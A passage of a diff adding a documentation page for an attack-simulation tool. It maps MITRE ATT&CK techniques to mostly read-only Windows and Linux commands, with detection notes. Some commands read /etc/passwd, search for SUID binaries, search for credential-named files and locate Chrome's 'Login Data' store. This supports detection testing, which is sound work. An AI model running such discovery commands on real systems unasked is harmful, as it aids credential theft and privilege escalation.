+<td>Information gathering about the target</td>
+</tr>
+<tr>
+<td>Initial Access</td>
+<td>3</td>
+<td>Gaining initial access to the network</td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>5</td>
+<td>Running commands via shells and interpreters</td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>4</td>
+<td>Maintaining access to the system</td>
+</tr>
+<tr>
+<td>Privilege Escalation</td>
+<td>4</td>
+<td>Gaining higher permissions</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>6</td>
+<td>Avoiding detection by security tools</td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>4</td>
+<td>Stealing credentials and secrets</td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>9</td>
+<td>Information gathering about the system and network</td>
+</tr>
+<tr>
+<td>Lateral Movement</td>
+<td>3</td>
+<td>Moving through the network</td>
+</tr>
+<tr>
+<td>Collection</td>
+<td>4</td>
+<td>Gathering target data</td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>3</td>
+<td>Communicating with compromised systems</td>
+</tr>
+<tr>
+<td>Exfiltration</td>
+<td>3</td>
+<td>Stealing data from the target</td>
+</tr>
+<tr>
+<td>Impact</td>
+<td>3</td>
+<td>Manipulating or destroying systems</td>
+</tr>
+</tbody>
+</table>
+<p><strong>All techniques are Safe Mode compatible</strong> (non-destructive).</p>
+<hr />
+<h2 id="reconnaissance-2-techniques">Reconnaissance (2 techniques)<a class="headerlink" href="#reconnaissance-2-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1592004-gather-victim-host-information-client-configurations">T1592.004 - Gather Victim Host Information: Client Configurations<a class="headerlink" href="#t1592004-gather-victim-host-information-client-configurations" title="Permanent link">&para;</a></h3>
+<p>Enumerates client software configurations.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Windows</label><label for="__tabbed_1_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>cat<span class="w"> </span>/etc/os-release<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>uname<span class="w"> </span>-m
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (systeminfo.exe, cat)</p>
+<hr />
+<h3 id="t1595002-active-scanning-vulnerability-scanning">T1595.002 - Active Scanning: Vulnerability Scanning<a class="headerlink" href="#t1595002-active-scanning-vulnerability-scanning" title="Permanent link">&para;</a></h3>
+<p>Simulates vulnerability scanning by checking for common service ports.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">Windows</label><label for="__tabbed_2_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>netstat -an | findstr &quot;LISTENING&quot;
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ss<span class="w"> </span>-tlnp<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">||</span><span class="w"> </span>netstat<span class="w"> </span>-tlnp<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Network Connection, Process Creation</p>
+<hr />
+<h2 id="initial-access-3-techniques">Initial Access (3 techniques)<a class="headerlink" href="#initial-access-3-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1078-valid-accounts">T1078 - Valid Accounts<a class="headerlink" href="#t1078-valid-accounts" title="Permanent link">&para;</a></h3>
+<p>Enumerates valid accounts that could be used for initial access.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="3:2"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio" /><input id="__tabbed_3_2" name="__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="__tabbed_3_1">Windows</label><label for="__tabbed_3_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>net user &amp;&amp; net localgroup administrators
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span>nologin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="nb">false</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (enumeration only)
+<strong>Detection:</strong> Process Creation (net.exe, cat)</p>
+<hr />
+<h3 id="t1133-external-remote-services">T1133 - External Remote Services<a class="headerlink" href="#t1133-external-remote-services" title="Permanent link">&para;</a></h3>
+<p>Checks for external remote services (RDP, SSH, VNC).</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="4:2"><input checked="checked" id="__tabbed_4_1" name="__tabbed_4" type="radio" /><input id="__tabbed_4_2" name="__tabbed_4" type="radio" /><div class="tabbed-labels"><label for="__tabbed_4_1">Windows</label><label for="__tabbed_4_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>netstat -an | findstr &quot;:3389 :22 :5900&quot;
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ss<span class="w"> </span>-tlnp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;:(22|3389|5900)\s&quot;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (enumeration only)
+<strong>Detection:</strong> Process Creation, Network Connection</p>
+<hr />
+<h3 id="t1190-exploit-public-facing-application">T1190 - Exploit Public-Facing Application<a class="headerlink" href="#t1190-exploit-public-facing-application" title="Permanent link">&para;</a></h3>
+<p>Enumerates public-facing services and their versions.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="5:2"><input checked="checked" id="__tabbed_5_1" name="__tabbed_5" type="radio" /><input id="__tabbed_5_2" name="__tabbed_5" type="radio" /><div class="tabbed-labels"><label for="__tabbed_5_1">Windows</label><label for="__tabbed_5_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>netstat -ano | findstr &quot;LISTENING&quot;
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>ss<span class="w"> </span>-tlnp
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (enumeration only)
+<strong>Detection:</strong> Process Creation</p>
+<hr />
+<h2 id="execution-5-techniques">Execution (5 techniques)<a class="headerlink" href="#execution-5-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1059001-powershell">T1059.001 - PowerShell<a class="headerlink" href="#t1059001-powershell" title="Permanent link">&para;</a></h3>
+<p>Executes PowerShell commands.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">Get-Process</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-First</span> <span class="n">5</span>
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Windows
+<strong>Safe:</strong> Yes (current command)
+<strong>Detection:</strong> Process Creation (powershell.exe), Script Block Logging</p>
+<hr />
+<h3 id="t1059003-windows-command-shell">T1059.003 - Windows Command Shell<a class="headerlink" href="#t1059003-windows-command-shell" title="Permanent link">&para;</a></h3>
+<p>Executes Windows CMD commands.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>echo %USERNAME% &amp;&amp; echo %COMPUTERNAME%
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Windows
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (cmd.exe)</p>
+<hr />
+<h3 id="t1059004-unix-shell">T1059.004 - Unix Shell<a class="headerlink" href="#t1059004-unix-shell" title="Permanent link">&para;</a></h3>
+<p>Executes Unix shell commands.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="6:2"><input checked="checked" id="__tabbed_6_1" name="__tabbed_6" type="radio" /><input id="__tabbed_6_2" name="__tabbed_6" type="radio" /><div class="tabbed-labels"><label for="__tabbed_6_1">Bash</label><label for="__tabbed_6_2">sh</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$USER</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>hostname
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$USER</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>hostname
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (bash, sh)</p>
+<hr />
+<h3 id="t1047-windows-management-instrumentation">T1047 - Windows Management Instrumentation<a class="headerlink" href="#t1047-windows-management-instrumentation" title="Permanent link">&para;</a></h3>
+<p>Enumerates system information via WMI.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>wmic os get caption,version,buildnumber /format:list
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Windows
+<strong>Safe:</strong> Yes (read-only WMI query)
+<strong>Detection:</strong> Process Creation (wmic.exe), WMI Activity</p>
+<hr />
+<h3 id="t1059006-python">T1059.006 - Python<a class="headerlink" href="#t1059006-python" title="Permanent link">&para;</a></h3>
+<p>Executes Python commands for system enumeration.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="7:2"><input checked="checked" id="__tabbed_7_1" name="__tabbed_7" type="radio" /><input id="__tabbed_7_2" name="__tabbed_7" type="radio" /><div class="tabbed-labels"><label for="__tabbed_7_1">Windows</label><label for="__tabbed_7_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>python -c &quot;import platform; print(platform.platform())&quot;
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import platform; print(platform.platform())&quot;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes
+<strong>Detection:</strong> Process Creation (python.exe, python3)</p>
+<hr />
+<h2 id="persistence-4-techniques">Persistence (4 techniques)<a class="headerlink" href="#persistence-4-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1053005-scheduled-task">T1053.005 - Scheduled Task<a class="headerlink" href="#t1053005-scheduled-task" title="Permanent link">&para;</a></h3>
+<p>Queries scheduled tasks.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>schtasks /query /fo LIST
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Windows
+<strong>Safe:</strong> Yes (query only, doesn't create tasks)
+<strong>Detection:</strong> Process Creation (schtasks.exe)</p>
+<hr />
+<h3 id="t1547001-registry-run-keys-startup-folder">T1547.001 - Registry Run Keys / Startup Folder<a class="headerlink" href="#t1547001-registry-run-keys-startup-folder" title="Permanent link">&para;</a></h3>
+<p>Queries registry Run keys for persistence mechanisms.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="8:2"><input checked="checked" id="__tabbed_8_1" name="__tabbed_8" type="radio" /><input id="__tabbed_8_2" name="__tabbed_8" type="radio" /><div class="tabbed-labels"><label for="__tabbed_8_1">CMD</label><label for="__tabbed_8_2">PowerShell</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&#39;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows
+<strong>Safe:</strong> Yes (query only, doesn't modify registry)
+<strong>Detection:</strong> Process Creation (reg.exe), Registry access</p>
+<hr />
+<h3 id="t1053003-cron">T1053.003 - Cron<a class="headerlink" href="#t1053003-cron" title="Permanent link">&para;</a></h3>
+<p>Enumerates cron jobs for persistence detection.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>crontab<span class="w"> </span>-l<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron*<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Linux
+<strong>Safe:</strong> Yes (read-only)
+<strong>Detection:</strong> Process Creation (crontab), File Access</p>
+<hr />
+<h3 id="t1543002-systemd-service">T1543.002 - Systemd Service<a class="headerlink" href="#t1543002-systemd-service" title="Permanent link">&para;</a></h3>
+<p>Enumerates systemd services for persistence detection.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>systemctl<span class="w"> </span>list-unit-files<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--state<span class="o">=</span>enabled
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Linux
+<strong>Safe:</strong> Yes (read-only)
+<strong>Detection:</strong> Process Creation (systemctl)</p>
+<hr />
+<h2 id="privilege-escalation-4-techniques">Privilege Escalation (4 techniques)<a class="headerlink" href="#privilege-escalation-4-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1548001-setuid-and-setgid">T1548.001 - Setuid and Setgid<a class="headerlink" href="#t1548001-setuid-and-setgid" title="Permanent link">&para;</a></h3>
+<p>Searches for SUID/SGID binaries that could be exploited.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Linux
+<strong>Safe:</strong> Yes (read-only search)
+<strong>Detection:</strong> Process Creation (find), File Access</p>
+<hr />
+<h3 id="t1548002-bypass-user-account-control">T1548.002 - Bypass User Account Control<a class="headerlink" href="#t1548002-bypass-user-account-control" title="Permanent link">&para;</a></h3>
+<p>Checks UAC configuration status.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Windows
+<strong>Safe:</strong> Yes (read-only)
+<strong>Detection:</strong> Process Creation (reg.exe), Registry Access</p>
+<hr />
+<h3 id="t1078003-local-accounts">T1078.003 - Local Accounts<a class="headerlink" href="#t1078003-local-accounts" title="Permanent link">&para;</a></h3>
+<p>Enumerates local accounts with elevated privileges.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="9:2"><input checked="checked" id="__tabbed_9_1" name="__tabbed_9" type="radio" /><input id="__tabbed_9_2" name="__tabbed_9" type="radio" /><div class="tabbed-labels"><label for="__tabbed_9_1">Windows</label><label for="__tabbed_9_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>net localgroup administrators
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;^(root|sudo)&quot;</span><span class="w"> </span>/etc/group
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (enumeration only)
+<strong>Detection:</strong> Process Creation (net.exe, grep)</p>
+<hr />
+<h3 id="t1134001-token-impersonationtheft">T1134.001 - Token Impersonation/Theft<a class="headerlink" href="#t1134001-token-impersonationtheft" title="Permanent link">&para;</a></h3>
+<p>Enumerates process tokens and privileges.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>whoami /priv
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Windows
+<strong>Safe:</strong> Yes (read-only)
+<strong>Detection:</strong> Process Creation (whoami.exe)</p>
+<hr />
+<h2 id="defense-evasion-6-techniques">Defense Evasion (6 techniques)<a class="headerlink" href="#defense-evasion-6-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1070004-file-deletion">T1070.004 - File Deletion<a class="headerlink" href="#t1070004-file-deletion" title="Permanent link">&para;</a></h3>
+<p>Simulates file deletion (safe mode only echoes).</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="10:2"><input checked="checked" id="__tabbed_10_1" name="__tabbed_10" type="radio" /><input id="__tabbed_10_2" name="__tabbed_10" type="radio" /><div class="tabbed-labels"><label for="__tabbed_10_1">Windows</label><label for="__tabbed_10_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>echo Test file deletion simulation
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">echo</span><span class="w"> </span>Test<span class="w"> </span>file<span class="w"> </span>deletion<span class="w"> </span>simulation
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (simulation only)
+<strong>Detection:</strong> File System events, Process Creation</p>
+<hr />
+<h3 id="t1562001-disable-or-modify-tools">T1562.001 - Disable or Modify Tools<a class="headerlink" href="#t1562001-disable-or-modify-tools" title="Permanent link">&para;</a></h3>
+<p>Checks security tool status without disabling them.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="11:2"><input checked="checked" id="__tabbed_11_1" name="__tabbed_11" type="radio" /><input id="__tabbed_11_2" name="__tabbed_11" type="radio" /><div class="tabbed-labels"><label for="__tabbed_11_1">Windows</label><label for="__tabbed_11_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>sc query WinDefend
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>systemctl<span class="w"> </span>status<span class="w"> </span>apparmor<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">||</span><span class="w"> </span>systemctl<span class="w"> </span>status<span class="w"> </span>selinux<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (query only)
+<strong>Detection:</strong> Process Creation, Service Query</p>
+<hr />
+<h3 id="t1027-obfuscated-files-or-information">T1027 - Obfuscated Files or Information<a class="headerlink" href="#t1027-obfuscated-files-or-information" title="Permanent link">&para;</a></h3>
+<p>Demonstrates obfuscation detection by encoding/decoding a test string.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="12:2"><input checked="checked" id="__tabbed_12_1" name="__tabbed_12" type="radio" /><input id="__tabbed_12_2" name="__tabbed_12" type="radio" /><div class="tabbed-labels"><label for="__tabbed_12_1">Windows</label><label for="__tabbed_12_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s2">&quot;AutoStrike-Test&quot;</span><span class="p">))</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;AutoStrike-Test&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (harmless encoding)
+<strong>Detection:</strong> Script Block Logging, Process Creation</p>
+<hr />
+<h3 id="t1070001-clear-windows-event-logs">T1070.001 - Clear Windows Event Logs<a class="headerlink" href="#t1070001-clear-windows-event-logs" title="Permanent link">&para;</a></h3>
+<p>Queries event log sizes without clearing them.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>wevtutil gli Security
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Windows
+<strong>Safe:</strong> Yes (read-only query)
+<strong>Detection:</strong> Process Creation (wevtutil.exe)</p>
+<hr />
+<h3 id="t1036005-match-legitimate-name-or-location">T1036.005 - Match Legitimate Name or Location<a class="headerlink" href="#t1036005-match-legitimate-name-or-location" title="Permanent link">&para;</a></h3>
+<p>Checks for processes running from unusual locations.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="13:2"><input checked="checked" id="__tabbed_13_1" name="__tabbed_13" type="radio" /><input id="__tabbed_13_2" name="__tabbed_13" type="radio" /><div class="tabbed-labels"><label for="__tabbed_13_1">Windows</label><label for="__tabbed_13_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>wmic process get name,executablepath /format:csv
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>ps<span class="w"> </span>aux<span class="w"> </span>--sort<span class="o">=</span>-%mem<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (read-only)
+<strong>Detection:</strong> Process Creation</p>
+<hr />
+<h3 id="t1218011-rundll32">T1218.011 - Rundll32<a class="headerlink" href="#t1218011-rundll32" title="Permanent link">&para;</a></h3>
+<p>Enumerates Rundll32 usage patterns.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>tasklist /FI &quot;IMAGENAME eq rundll32.exe&quot;
+</span></code></pre></div>
+<p><strong>Platforms:</strong> Windows
+<strong>Safe:</strong> Yes (query only)
+<strong>Detection:</strong> Process Creation (tasklist.exe)</p>
+<hr />
+<h2 id="credential-access-4-techniques">Credential Access (4 techniques)<a class="headerlink" href="#credential-access-4-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1552001-credentials-in-files">T1552.001 - Credentials In Files<a class="headerlink" href="#t1552001-credentials-in-files" title="Permanent link">&para;</a></h3>
+<p>Searches for files that may contain credentials.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="14:2"><input checked="checked" id="__tabbed_14_1" name="__tabbed_14" type="radio" /><input id="__tabbed_14_2" name="__tabbed_14" type="radio" /><div class="tabbed-labels"><label for="__tabbed_14_1">Windows</label><label for="__tabbed_14_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>dir /s /b C:\Users\*.txt C:\Users\*.ini C:\Users\*.cfg 2&gt;nul | findstr /i &quot;pass config cred&quot;
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>find<span class="w"> </span>/home<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.conf&quot;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.cfg&quot;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.ini&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (file search only, no reading)
+<strong>Detection:</strong> Process Creation, File Access</p>
+<hr />
+<h3 id="t1555003-credentials-from-web-browsers">T1555.003 - Credentials from Web Browsers<a class="headerlink" href="#t1555003-credentials-from-web-browsers" title="Permanent link">&para;</a></h3>
+<p>Checks for browser credential storage locations.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="15:2"><input checked="checked" id="__tabbed_15_1" name="__tabbed_15" type="radio" /><input id="__tabbed_15_2" name="__tabbed_15" type="radio" /><div class="tabbed-labels"><label for="__tabbed_15_1">Windows</label><label for="__tabbed_15_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>dir &quot;%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data&quot; 2&gt;nul
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
